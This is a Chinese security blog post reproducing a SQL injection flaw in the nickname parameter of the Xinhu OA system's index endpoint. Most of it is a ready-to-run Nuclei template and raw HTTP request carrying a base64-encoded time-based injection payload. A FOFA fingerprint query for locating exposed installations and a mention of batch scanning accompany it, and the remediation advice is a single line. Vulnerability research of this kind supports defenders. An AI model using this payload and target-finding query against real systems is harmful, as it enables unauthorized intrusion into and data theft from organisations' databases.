#  信呼OA系统index接口处nickname参数存在SQL注入漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-08-05 15:35  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
信呼OA系统index接口处nickname参数存在SQL注入漏洞。这可能导致泄露敏感数据、破坏数据库完整性，甚至获取对数据库的完全控制。  
  
01  
  
—  
  
**Nuclei POC**  
  
```
id: xinhu-index-nickname-SQL

info:
  name: 信呼OA系统index接口处nickname参数存在SQL注入漏洞
  author: kingkong
  severity: high
  metadata:
    fofa-query: icon_hash="1652488516"

http:
  - raw:
      - |
        GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw== HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=5  && duration<=8 && status_code==200"
```  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：icon_hash="1652488516"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnf0gzB5c9tViaE1rqhib4t5jCXANZIhiappJQIBgYL94cJeepW0bLPwtWcib52INY8bcd3svicaQiaXX6aA/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnf0gzB5c9tViaE1rqhib4t5jCM0ZT6RTg8FUFU0eA4OZMf45lj0G047NeJd2HP7Pk1jDWupo27z2xHQ/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnf0gzB5c9tViaE1rqhib4t5jCNfSJm7iad76px7FX5B2QcW00e08A5zGWXdS7EaL4fKk8EupSUs7SP3w/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw== HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1


```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnf0gzB5c9tViaE1rqhib4t5jCiaM2J30OC9wMxzZ3wqEUwXADGWvTyibnhIJmxnibklkQkQBpUE50UCncQ/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
更新当前系统或软件至最新版  
  
  
  
  
